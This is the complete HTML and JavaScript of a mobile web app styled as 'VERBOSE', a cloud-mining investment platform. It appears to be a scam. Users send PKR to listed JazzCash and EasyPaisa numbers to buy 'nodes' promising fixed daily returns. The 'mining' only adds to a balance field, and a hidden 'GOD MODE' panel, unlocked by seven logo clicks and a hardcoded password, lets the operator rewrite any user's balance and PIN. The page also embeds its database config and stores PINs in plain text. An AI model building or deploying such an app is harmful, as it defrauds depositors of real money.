<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Quantum Infrastructure</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #030303; --card: rgba(255,255,255,0.05); --border: rgba(255,255,255,0.1); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.3s; font-family: 'Plus Jakarta Sans', sans-serif; outline: none; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }

  header { display: flex; align-items: center; padding: 65px 20px 15px; position: relative; justify-content: center; border-bottom: 1px solid var(--border); }
  .logo-text { font-size: 24px; font-weight: 800; letter-spacing: 8px; text-shadow: 0 0 15px var(--neon); cursor: pointer; }

  .page { max-width: 450px; margin: 0 auto; padding: 20px 20px 140px; display: none; }
  .active { display: block !important; }

  .wallet-box { background: linear-gradient(135deg, #0a0a0a, #000); border: 1px solid var(--neon); padding: 35px; border-radius: 40px; text-align: center; margin-bottom: 25px; }
  .node-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 20px; margin-bottom: 15px; border-left: 4px solid var(--neon); }

  /* ADMIN HUD STYLING */
  .req-container { max-height: 250px; overflow-y: auto; background: rgba(0,0,0,0.5); border-radius: 20px; padding: 10px; border: 1px solid var(--gold); margin-bottom: 20px; }
  .req-card { background: #111; padding: 12px; border-radius: 15px; margin-bottom: 8px; font-size: 10px; border-left: 3px solid var(--gold); line-height: 1.5; }

  input, select { width: 100%; padding: 16px; margin-top: 10px; border-radius: 18px; border: 1px solid var(--border); background: rgba(255,255,255,0.02); color: #fff; font-size: 13px; }
  .btn-action { width: 100%; padding: 18px; border-radius: 20px; border: none; font-weight: 800; cursor: pointer; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; margin-top: 15px; text-transform: uppercase; }

  .nav { position: fixed; bottom: 25px; left: 15px; right: 15px; background: rgba(10,10,10,0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 22px; border-radius: 40px; border: 1px solid var(--border); z-index: 1000; }
  .nav-item { font-size: 9px; opacity: 0.5; cursor: pointer; font-weight: 800; text-transform: uppercase; color: #fff; }
  .nav-item.active { opacity: 1; color: var(--neon); }
</style>
</head>
<body>

<header><div class="logo-text" id="adminTrigger">VERBOSE</div></header>

<div id="dash" class="page active">
    <div class="wallet-box">
        <span id="uID" style="font-size:10px; opacity:0.6; letter-spacing:2px;">IDENTITY: ---</span>
        <div style="font-size:38px; font-weight:800; margin-top:10px;">PKR <span id="uBal">0.00</span></div>
    </div>
    <div id="profitHUD" class="node-card" style="display:none; text-align:center; border-color:var(--success);">
        <small style="color:var(--success); font-weight:800;">AUTO-MINING ACTIVE</small>
        <div id="countdown" style="font-size:26px; font-weight:800; margin:10px 0;">24:00:00</div>
        <div style="height:4px; background:rgba(255,255,255,0.1); border-radius:10px; overflow:hidden;">
            <div id="pBar" style="height:100%; background:var(--success); width:0%;"></div>
        </div>
    </div>
</div>

<div id="nodesPage" class="page">
    <h3 style="letter-spacing:1px;">CLUSTERS</h3>
    <div id="nodeGrid"></div>
</div>

<div id="finance" class="page">
    <div class="node-card" style="border-color:var(--success);">
        <h3>DEPOSIT</h3>
        <p style="font-size:11px;">JazzCash: 03705519562 | EasyPaisa: 03379827882</p>
        <input id="dAmt" type="number" placeholder="Amount">
        <input id="dTID" placeholder="TID">
        <button class="btn-action" onclick="sendReq('Deposit')">Submit</button>
    </div>
    <div class="node-card" style="border-color:var(--error);">
        <h3>WITHDRAW</h3>
        <input id="wNum" type="number" placeholder="Number">
        <input id="wAmt" type="number" placeholder="Min 500">
        <button class="btn-action" style="background:var(--error);" onclick="sendReq('Withdraw')">Request</button>
    </div>
</div>

<div id="infoPage" class="page">
    <h3>COMPANY DATA</h3>
    <div class="node-card" style="font-size:11px; line-height:1.6;">
        <b>VERBOSE LTD.</b> Cloud Mining & Yield Solutions.<br>
        24/7 Automated profit distribution. Secure Ledger Technology.
    </div>
    <h3>PRIVACY & TERMS</h3>
    <div class="node-card" style="font-size:10px; opacity:0.6;">
        Assets are locked for node duration. Withdrawals process in 1-24h. No double accounts allowed.
    </div>
</div>

<div id="adminPage" class="page">
    <h2 style="color:var(--gold); text-align:center; letter-spacing:4px;">GOD MODE</h2>
    
    <small style="color:var(--gold);">LIVE USER REQUESTS</small>
    <div class="req-container" id="adminReqList"></div>

    <div class="node-card" style="border-color:var(--gold);">
        <small>DATABASE CONTROL</small>
        <input id="admT" placeholder="Target User Phone">
        <input id="admV" type="number" placeholder="Adjust Balance (+/-)">
        <input id="admP" placeholder="Change User PIN">
        <select id="admPlan">
            <option value="keep">Keep Current Plan</option>
            <option value="reset">Reset/Remove Plan</option>
        </select>
        <button class="btn-action" style="background:var(--gold); color:#000;" onclick="godSync()">OVERWRITE DATA</button>
    </div>
</div>

<nav class="nav">
    <div class="nav-item active" onclick="tab('dash', this)">Home</div>
    <div class="nav-item" onclick="tab('nodesPage', this)">Nodes</div>
    <div class="nav-item" onclick="tab('finance', this)">Finance</div>
    <div class="nav-item" onclick="tab('infoPage', this)">Details</div>
</nav>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, update, onValue, get, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  let user = localStorage.getItem('v_user');

  const nodes = [{n:"Starter",p:500,d:55},{n:"Pro",p:1000,d:125},{n:"Elite",p:2500,d:320},{n:"Ultra",p:5000,d:700}];

  // --- GOD MODE CORE ---
  let c = 0;
  document.getElementById('adminTrigger').onclick = () => { if(++c >= 7) { if(prompt("God Access?")==="nazim786") { tab('adminPage'); loadGodView(); } c=0; } };

  const loadGodView = () => {
    onValue(ref(db, `admin/requests`), s => {
        const div = document.getElementById('adminReqList'); div.innerHTML = "";
        if(s.exists()) Object.entries(s.val()).reverse().forEach(([k,v]) => {
            div.innerHTML += `<div class="req-card"><b>${v.type}</b> | ID: ${v.user}<br>AMT: ${v.amt} | INFO: ${v.info}<br><small>${v.time}</small></div>`;
        });
    });
  };

  window.godSync = async () => {
    const target = document.getElementById('admT').value;
    const balanceAdj = Number(document.getElementById('admV').value);
    const newPin = document.getElementById('admP').value;
    const planAction = document.getElementById('admPlan').value;

    const snap = await get(ref(db, `users/${target}`));
    if(!snap.exists()) return alert("User not found");
    
    let updates = {};
    if(balanceAdj) updates.balance = (snap.val().balance || 0) + balanceAdj;
    if(newPin) updates.pass = newPin;
    if(planAction === 'reset') { updates.hasActive = false; updates.daily = 0; updates.activeName = "NONE"; }
    
    await update(ref(db, `users/${target}`), updates);
    alert("User Cloud Data Overwritten!");
  };

  // --- USER CORE ---
  const renderNodes = (active) => {
    const g = document.getElementById('nodeGrid'); g.innerHTML = "";
    nodes.forEach(x => {
        g.innerHTML += `<div class="node-card"><b>${x.n} Node</b><br><small>PKR ${x.d}/day</small><br>
        <button class="btn-action" ${active?'disabled':''} onclick="buyNode(${x.p},${x.d},'${x.n}')">${active?'ACTIVE':'ACTIVATE '+x.p}</button></div>`;
    });
  };

  window.buyNode = async (p, d, name) => {
    const s = await get(ref(db, `users/${user}`));
    if(s.val().balance < p) return alert("Low balance");
    const t = Date.now();
    await update(ref(db, `users/${user}`), { balance: s.val().balance-p, daily:d, hasActive:true, activeName:name, startTime:t, lastProfitTime:t });
    alert("Node Linked!");
  };

  window.sendReq = (type) => {
    const amt = document.getElementById(type === 'Deposit' ? 'dAmt' : 'wAmt').value;
    const info = document.getElementById(type === 'Deposit' ? 'dTID' : 'wNum').value;
    push(ref(db, `admin/requests`), { user, type, amt, info, time: new Date().toLocaleString() });
    alert("Synchronizing with Admin HUD...");
  };

  const engine = (d) => {
    if(!d.hasActive) return;
    document.getElementById('profitHUD').style.display = 'block';
    const diff = (d.lastProfitTime + 86400000) - Date.now();
    if(diff <= 0) update(ref(db, `users/${user}`), { balance: d.balance + d.daily, lastProfitTime: Date.now() });
    else {
        let h = Math.floor(diff/3600000).toString().padStart(2,'0');
        let m = Math.floor((diff%3600000)/60000).toString().padStart(2,'0');
        let s = Math.floor((diff%60000)/1000).toString().padStart(2,'0');
        document.getElementById('countdown').innerText = `${h}:${m}:${s}`;
        document.getElementById('pBar').style.width = `${((86400000-diff)/86400000)*100}%`;
    }
  };

  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
  };

  if(user) {
    onValue(ref(db, `users/${user}`), s => {
        const d = s.val(); 
        document.getElementById('uBal').innerText = (d.balance || 0).toLocaleString();
        document.getElementById('uID').innerText = "ID: " + user;
        renderNodes(d.hasActive); engine(d);
    });
  } else {
    let p = prompt("Phone:"); let pin = prompt("Set PIN:");
    if(p && pin) { set(ref(db, `users/${p}`), { balance:0, daily:0, hasActive:false, pass:pin }); localStorage.setItem('v_user', p); location.reload(); }
  }
</script>
</body>
</html>
